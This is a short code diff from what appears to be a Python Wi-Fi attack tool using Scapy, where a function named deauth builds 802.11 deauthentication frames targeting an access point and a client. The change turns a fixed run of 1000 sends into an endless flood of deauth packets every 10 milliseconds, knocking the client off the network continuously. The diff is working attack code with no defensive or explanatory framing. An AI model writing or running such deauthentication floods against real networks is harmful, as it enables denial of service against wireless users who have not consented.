@@ -20,9 +20,8 @@ def deauth(iface: str, BSSID: str, client: str, reason: int = 7):
         Dot11(type=0, subtype=12, addr1=client, addr2=BSSID, addr3=BSSID) / \
         Dot11Deauth(reason=reason)
     print(f'SENDING DEAUTH to {BSSID}')
-    for _ in range(1000):
-        sendp(packet1, iface=iface, count=1)
-        sendp(packet2, iface=iface, count=1)
+    
+    sendp(packet2, iface=iface, loop=1, inter=0.01)
 
 
 def deauth_clients(iface: str, wifi: Wifi, reasoncode: int = 6):
